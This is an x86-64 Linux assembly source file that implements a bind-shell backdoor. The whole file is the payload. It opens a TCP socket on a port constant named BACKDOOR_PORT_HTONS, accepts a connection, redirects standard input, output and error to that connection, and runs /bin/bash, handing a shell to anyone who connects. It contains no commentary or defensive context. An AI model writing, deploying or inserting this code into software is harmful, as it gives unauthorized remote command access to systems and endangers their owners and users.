.include "sys_defs.h"
.include "app_defs.h"

.section .bss
.size	sock_address, 16
sock_address:
	.zero	16
	.comm	sock,4,4
	.comm	sock_fd,4,4
	.section	.data

.bash_str_data:
	.string	"/bin/bash"
	.section .text

bash:
	.quad	.bash_str_data

.global _start
_start:
	movq    $SYS_SOCKET, %rax
	movl	$AF_INET, %edi
	movl	$SOCK_STREAM, %esi
	movl	$IPPROTO_TCP, %edx
	syscall
	movl	%eax, sock(%rip)

	movq	$SYS_BIND, %rax
	movw	$AF_INET, sock_address(%rip)
	movw	$BACKDOOR_PORT_HTONS, sock_address+SIZEOF_UINT_16_T(%rip)
	movl    sock(%rip), %edi
	movl	$SIZEOF_STRUCT_SOCKADDR, %edx
	movl	$sock_address, %esi
	syscall

	movq    $SYS_LISTEN, %rax
	movl    sock(%rip), %edi
	movl	$ACCEPTED_CONNECTIONS, %esi
	syscall

	movq	$SYS_ACCEPT, %rax
	movl	sock(%rip), %edi
	movl	$NULL, %edx
	movl	$NULL, %esi
	syscall
	movl	%eax, sock_fd(%rip)

	movq	$SYS_DUP2, %rax
	movl	sock_fd(%rip), %edi
	movl	$STDIN, %esi
	syscall

	movq	$SYS_DUP2, %rax
	movl	sock_fd(%rip), %edi
	movl	$STDOUT, %esi
	syscall

	movq	$SYS_DUP2, %rax
	movl	sock_fd(%rip), %edi
	movl	$STDERR, %esi
	syscall

	movq	$SYS_EXECVE, %rax
	movq 	bash(%rip), %rdi
	movq	$NULL, %rsi
	movq	$NULL, %rdx
	syscall

	movq $SYS_EXIT, %rax
	movq $0, %rdi
	syscall
